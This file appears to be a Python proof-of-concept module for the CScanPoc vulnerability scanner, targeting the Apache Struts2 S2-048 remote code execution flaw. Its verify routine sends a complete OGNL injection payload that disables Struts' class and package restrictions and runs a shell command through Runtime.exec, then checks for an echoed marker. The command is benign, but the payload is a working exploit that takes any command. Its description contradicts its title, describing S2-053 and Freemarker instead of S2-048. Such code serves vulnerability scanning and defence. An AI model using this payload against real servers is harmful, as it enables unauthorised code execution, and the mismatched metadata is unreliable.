# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Apache_Struts_0015_p'  # 平台漏洞编号，留空
    name = 'Apache Struts2 S2-048远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2017-07-07'  # 漏洞公布时间
    desc = '''
        Struts2 是Apache软件基金会负责维护的一个基于MVC设计模式的Web应用框架开源项目。 
        Apache Struts2存在S2-053远程代码执行漏洞，在Freemarker标记中使用错误的表达式而不是字符串文字时，导致攻击者远程执行代码攻击。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-13259'  # 漏洞来源
    cnvd_id = 'CNVD-2017-13259'  # cnvd漏洞编号
    cve_id = 'CVE-2017-9791'  # cve编号
    product = 'Apache-Struts'  # 漏洞应用名称
    product_version = 'Struts 2.3.x with Struts 1 plugin and Struts 1 action'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3a1704ac-e39e-46a7-9884-d2dfbed84f8e'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-19'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            data = {'name': '''
            %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('echo 92933839f1efb2da9a4799753ee8d79c').getInputStream())).(#q)}
            ''',
                    'age': '1'}
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            request = requests.post(self.target, data=data)
            r = request.text
            if '92933839f1efb2da9a4799753ee8d79c' in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
